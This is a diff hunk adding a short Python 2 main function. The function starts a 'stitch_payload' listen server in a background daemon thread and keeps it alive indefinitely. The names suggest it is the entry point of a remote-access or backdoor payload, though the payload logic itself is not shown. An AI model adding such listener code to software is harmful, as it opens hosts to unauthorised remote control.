@@ -1,0 +1,16 @@
+def main():
+    if not stitch_running():
+        st_pyld = stitch_payload()
+        try:
+            listen = threading.Thread(target=st_pyld.listen_server, args=())
+            listen.daemon = True
+            listen.start()
+            while True:
+                sleep(60)
+        except KeyboardInterrupt:
+            pass
+        except Exception as e:
+            if dbg:
+                print e
+            pass
+        st_pyld.halt_listen_server()
